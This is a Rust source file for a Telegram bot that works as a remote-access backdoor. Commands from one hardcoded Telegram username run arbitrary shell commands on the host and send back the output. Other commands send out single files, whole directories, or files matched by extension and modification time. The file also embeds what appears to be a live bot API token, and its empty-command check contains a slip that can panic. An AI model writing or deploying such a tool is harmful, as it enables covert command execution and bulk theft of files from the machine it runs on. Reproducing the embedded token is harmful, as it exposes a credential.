use std::{
    fs, io,
    path::{Path, PathBuf},
    time::SystemTime,
};
mod time;

use teloxide::{prelude::*, types::InputFile, utils::command::BotCommands};

/*
use notify::{Event, RecursiveMode, Watcher};
use std::sync::mpsc;
*/
use crate::time::parse_time;

const API_KEY: &str = "8255327069:AAG02uf893ZGK9A5iHD-ZCKTtv1U2LWRQHY";

#[tokio::main]
async fn main() {
    //let ff = get_files("./", "0", "1d10h", &["rs"]).unwrap();
    //println!("{:?}", ff);
    pretty_env_logger::init();

    /*
    let (tx, rx) = mpsc::channel::<notify::Result<Event>>();
    */
    let admit = "bt733127";

    let bot = Bot::new(API_KEY);

    //std::thread::spawn(move || async {
    //let admit = Recipient::ChannelUsername("@bt733127".to_string());
    //bot.send_message(&admit, "Hello admin").await;
    Command::repl(bot, answer).await;
    //});

    /*
    let mut watcher = notify::recommended_watcher(tx).unwrap();
    watcher
        .watch(Path::new("./"), RecursiveMode::Recursive)
        .unwrap();
    for res in rx {
        match res {
            Ok(event) => println!("event: {:?}", event),
            Err(e) => println!("watch error: {:?}", e),
        }
    }*/
}

#[derive(BotCommands, Clone)]
#[command(
    rename_rule = "lowercase",
    description = "These commands are supported:"
)]
enum Command {
    #[command(description = "display this text.")]
    Help,
    #[command(description = "Check for online or offline")]
    Ping,
    #[command(description = "execute command")]
    Exec(String),
    #[command(description = "download file")]
    Download(String),
    #[command(description = "download all file (/downloadall dir from to exts)")]
    DownloadAll(String),
    #[command(description = "download all files from the target dir")]
    DownloadAllFiles(String),
    #[command(description = "print sender information")]
    PrintSender,
}

async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
    match cmd {
        Command::Help => {
            bot.send_message(msg.chat.id, Command::descriptions().to_string())
                .await?;
        }
        Command::Ping => {
            bot.send_message(msg.chat.id, "pong").await?;
        }
        Command::Exec(cc) => {
            if msg.from.is_none()
                || msg.from.as_ref().unwrap().username.is_none()
                || msg.from.unwrap().username.unwrap().as_str() != "bt733127"
            {
                bot.send_message(msg.chat.id, "Permission deny").await?;
                return Ok(());
            }
            let c = cc.split_whitespace().collect::<Vec<&str>>();
            if c.get(0).is_none() && (!c.get(0).unwrap().is_empty()) {
                return Ok(());
            }
            let args = c.iter().skip(1).map(|v| *v).collect::<Vec<&str>>();
            let mut cmd_x = std::process::Command::new(c.get(0).unwrap());
            cmd_x.args(args.iter().filter(|v| !v.is_empty()));
            let output = match cmd_x.output() {
                Ok(v) => v,
                Err(e) => {
                    bot.send_message(msg.chat.id, format!("ERROR: {}", e))
                        .await?;
                    return Ok(());
                }
            };
            let stdout = unsafe {
                output
                    .stdout
                    .chunks(3000)
                    .map(|v| str::from_utf8_unchecked(v).to_string())
                    .collect::<Vec<String>>()
            };
            let stderr = unsafe {
                output
                    .stderr
                    .chunks(3000)
                    .map(|v| str::from_utf8_unchecked(v).to_string())
                    .collect::<Vec<String>>()
            };
            bot.send_message(msg.chat.id, "stdout:").await?;
            for i in stdout {
                bot.send_message(msg.chat.id, i).await?;
            }
            bot.send_message(msg.chat.id, "sterr:").await?;
            for i in stderr {
                bot.send_message(msg.chat.id, i).await?;
            }
        }
        Command::Download(path) => {
            if msg.from.is_none()
                || msg.from.as_ref().unwrap().username.is_none()
                || msg.from.unwrap().username.unwrap().as_str() != "bt733127"
            {
                bot.send_message(msg.chat.id, "Permission deny").await?;
                return Ok(());
            }
            let file = match std::fs::File::open(&path.trim()) {
                Ok(f) => f,
                Err(e) => {
                    bot.send_message(msg.chat.id, format!("ERROR: {}", e))
                        .await?;
                    return Ok(());
                }
            };
            drop(file);
            bot.send_document(msg.chat.id, InputFile::file(path.trim()))
                .await?;
        }
        Command::DownloadAll(v) => {
            if msg.from.is_none()
                || msg.from.as_ref().unwrap().username.is_none()
                || msg.from.unwrap().username.unwrap().as_str() != "bt733127"
            {
                return Ok(());
            }
            let v = v.split_whitespace().collect::<Vec<&str>>();
            if v.len() < 4 {
                bot.send_message(msg.chat.id, "ERROR: Invalid Command")
                    .await?;
                return Ok(());
            }
            let dir = Path::new(v.get(0).unwrap());
            let exts = &v[2..];
            let out = match get_files(dir, v.get(1).unwrap(), v.get(2).unwrap(), exts) {
                Ok(f) => f,
                Err(e) => {
                    bot.send_message(msg.chat.id, format!("ERROR: {}", e))
                        .await?;
                    return Ok(());
                }
            };
            for f in out {
                if is_image(f.as_path()) {
                    if bot
                        .send_photo(msg.chat.id, InputFile::file(&f))
                        .await
                        .is_err()
                    {
                        eprintln!("Faild to send: {:?}", f);
                    };
                } else {
                    if bot
                        .send_document(msg.chat.id, InputFile::file(&f))
                        .await
                        .is_err()
                    {
                        eprintln!("Faild to send: {:?}", f);
                    };
                }
            }
        }
        Command::DownloadAllFiles(dir) => {
            if msg.from.is_none()
                || msg.from.as_ref().unwrap().username.is_none()
                || msg.from.unwrap().username.unwrap().as_str() != "bt733127"
            {
                return Ok(());
            }
            let entry = match fs::read_dir(dir) {
                Ok(d) => d,
                Err(e) => {
                    bot.send_message(msg.chat.id, format!("ERROR: {}", e))
                        .await?;
                    return Ok(());
                }
            };
            for entry in entry {
                let entry = match entry {
                    Ok(d) => d,
                    Err(e) => {
                        let _ = bot.send_message(msg.chat.id, format!("ERROR: {}", e)).await;
                        continue;
                    }
                };
                let path = entry.path();

                let meta = match fs::symlink_metadata(&path) {
                    Ok(d) => d,
                    Err(e) => {
                        let _ = bot.send_message(msg.chat.id, format!("ERROR: {}", e)).await;
                        continue;
                    }
                };
                let ft = meta.file_type();
                if ft.is_file() {
                    if bot
                        .send_document(msg.chat.id, InputFile::file(path))
                        .await
                        .is_err()
                    {
                        continue;
                    };
                }
            }
        }
        Command::PrintSender => {
            if msg.from.is_none()
                || msg.from.as_ref().unwrap().username.is_none()
                || msg
                    .from
                    .as_ref()
                    .unwrap()
                    .username
                    .as_ref()
                    .unwrap()
                    .as_str()
                    != "bt733127"
            {
                return Ok(());
            }
            bot.send_message(msg.chat.id, format!("Id: {:#?}", msg.id))
                .await?;
            bot.send_message(msg.chat.id, format!("Chat: {:#?}", msg.chat))
                .await?;
            bot.send_message(msg.chat.id, format!("From: {:#?}", msg.from))
                .await?;
        }
    };

    Ok(())
}

fn get_files<P: AsRef<Path>>(
    dir: P,
    from: &str,
    to: &str,
    exts: &[&str],
) -> io::Result<Vec<PathBuf>> {
    let mut out = Vec::<PathBuf>::new();

    let from = match parse_time(from) {
        Ok(v) => v,
        Err(e) => {
            return Err(io::Error::other(e));
        }
    };
    let to = match parse_time(to) {
        Ok(v) => v,
        Err(e) => {
            return Err(io::Error::other(e));
        }
    };
    let now = SystemTime::now();
    let mut from = match now.checked_sub(from) {
        Some(v) => v,
        None => {
            return Err(io::Error::other("invalid time"));
        }
    };
    let mut to = match now.checked_sub(to) {
        Some(v) => v,
        None => {
            return Err(io::Error::other("invalid time"));
        }
    };
    if to < from {
        let tmp = to;
        to = from;
        from = tmp;
    }
    find_files(dir.as_ref(), from, to, exts, &mut out)?;
    Ok(out)
}

fn is_image(path: &Path) -> bool {
    matches!(
        path.extension().and_then(|e| e.to_str()).map(|s| s.to_lowercase()),
        Some(ext) if matches!(
            ext.as_str(),
            "jpg" | "jpeg" | "png" | "gif" | "webp" | "bmp"
        )
    )
}

fn is_this_file(path: &Path, exts: &[&str]) -> bool {
    match path
        .extension()
        .and_then(|v| v.to_str())
        .map(|s| s.to_lowercase())
    {
        Some(ext) if exts.contains(&ext.as_str()) => true,
        _ => false,
    }
}

pub fn find_files(
    dir: &Path,
    from: SystemTime,
    to: SystemTime,
    exts: &[&str],
    out: &mut Vec<PathBuf>,
) -> std::io::Result<()> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();

        let meta = fs::symlink_metadata(&path)?;
        let ft = meta.file_type();

        // skip directory symlinks
        if ft.is_symlink() && path.is_dir() {
            continue;
        }

        if ft.is_dir() {
            find_files(&path, from, to, exts, out)?;
        } else if ft.is_file() && is_this_file(&path, exts) {
            let modified = meta.modified()?;
            if modified >= from && modified <= to {
                out.push(path);
            }
        }
    }
    Ok(())
}
